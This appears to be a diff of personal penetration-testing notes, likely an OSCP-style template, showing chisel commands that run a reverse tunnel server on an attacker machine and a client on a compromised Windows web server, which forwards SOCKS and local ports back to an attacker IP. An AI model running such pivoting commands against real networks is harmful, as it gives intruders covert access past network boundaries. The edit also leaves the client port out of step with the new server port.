@@ -401,10 +401,14 @@ listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:7777 --tcp
 
 #chisel
 #Run command on attacker machine
-chisel server -p 8001 --reverse
-#Run command on Web Server machine
+chisel server -p 8888 --reverse
+#<socks>Run command on Web Server machine
  .  .\chisel.exe client <% tp.frontmatter["LHOST"] %>:8001 R:1080:socks
 and edit the proxychains with the port that chisel provided
+
+#When trying to connect to a local port
+C:\\xampp\\htdocs>.\\chisel.exe client 192.168.45.176:8888 R:8090:localhost:80
+
 ```
 
 
